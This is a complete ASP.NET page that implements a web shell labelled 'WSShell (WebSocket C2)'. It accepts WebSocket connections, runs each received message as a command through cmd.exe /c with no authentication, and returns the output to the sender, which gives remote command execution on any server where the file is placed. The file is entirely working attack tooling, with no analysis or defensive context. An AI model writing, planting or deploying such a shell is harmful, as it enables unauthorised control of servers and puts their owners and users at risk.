<%@ Page Language="C#" %>
<%@ Import Namespace="System.Net.WebSockets" %>
<%@ Import Namespace="System.Threading" %>
<script runat="server">
    protected async void Page_Load(object sender, EventArgs e)
    {
        if (HttpContext.Current.IsWebSocketRequest)
        {
            HttpContext.Current.AcceptWebSocketRequest(async (ctx) =>
            {
                WebSocket ws = ctx.WebSocket;
                byte[] buffer = new byte[1024];
                while (ws.State == WebSocketState.Open)
                {
                    var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    string cmd = System.Text.Encoding.UTF8.GetString(buffer, 0, result.Count);
                    string output = ExecuteCommand(cmd);
                    byte[] outBytes = System.Text.Encoding.UTF8.GetBytes(output);
                    await ws.SendAsync(new ArraySegment<byte>(outBytes), WebSocketMessageType.Text, true, CancellationToken.None);
                }
            });
        }
        else
        {
            Response.Write("<html><body><h2>WSShell (WebSocket C2)</h2><p>This endpoint requires a WebSocket connection.</p></body></html>");
        }
    }
    private string ExecuteCommand(string cmd)
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
        return p.StandardOutput.ReadToEnd();
    }
</script>
